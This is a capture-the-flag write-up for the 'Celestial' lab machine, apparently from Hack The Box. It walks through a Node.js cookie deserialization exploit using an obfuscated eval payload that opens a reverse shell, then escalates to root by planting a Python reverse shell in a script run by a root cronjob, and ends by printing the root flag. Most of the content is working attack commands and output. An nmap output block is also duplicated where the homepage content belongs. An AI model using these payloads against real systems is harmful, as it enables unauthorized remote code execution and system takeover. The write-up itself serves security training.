## Celestial

__Machine IP: 10.10.10.85__
__Difficulty: Medium__

## Scanning

### Nmap Scanning

```bash
$ nmap -sC -sV  -oA nmap/celestial.nmap 10.10.10.85
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 03:47 EDT
Nmap scan report for 10.10.10.85
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT     STATE    SERVICE       VERSION
3000/tcp open     http          Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
8087/tcp filtered simplifymedia

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.57 seconds
```

- The index page is empty and running `gobuster` has resulted no results
- Index page 
![homepage](images/homepage.PNG)


```html
$ nmap -sC -sV  -oA nmap/celestial.nmap 10.10.10.85
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 03:47 EDT
Nmap scan report for 10.10.10.85
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT     STATE    SERVICE       VERSION
3000/tcp open     http          Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
8087/tcp filtered simplifymedia

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.57 seconds
```

- The initial request has a `cookie` value

-  The value is base64 encoded, on decoding..

```javascript
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

- Found node deserialization attack [Node Deserialiaztion attack](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

- generating the payload

```bash
python nodeshell.py 10.10.14.12 9001                          1 ⚙
[+] LHOST = 10.10.14.12
[+] LPORT = 9001
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,50,34,59,10,80,79,82,84,61,34,57,48,48,49,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```
- encode to `base64` and send it as cookie

__Result__

```bash
nc -lvnp  9001
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.85] 47578
Connected!
python -c 'import pty;pty.spawn("/bin/bash")';
sun@sun:~$ 
```


found a `cronjob` running as root from `syslog`

```bash
sun@sun:/var/log$ tail -1000 syslog | grep "root"
tail -1000 syslog | grep "root"
Sep  4 06:05:01 sun CRON[4414]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Sep  4 06:10:01 sun CRON[4459]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Sep  4 06:15:01 sun CRON[4530]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Sep  4 06:17:01 sun CRON[14240]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Sep  4 06:20:01 sun CRON[23360]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
```


- place the `python reverse shell` and wait for connection

```bash
sun@sun:~/Documents$ cat script.py
cat script.py
import socket
import os
import pty 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.12",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

__Result__

```bash
$ nc -lvnp  4242                                                                        1 ⨯
listening on [any] 4242 ...
ls
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.85] 33330
# ls
root.txt  script.py
# cat root.txt
cat root.txt
ba1d0019200a54e370ca151007a8095a
```



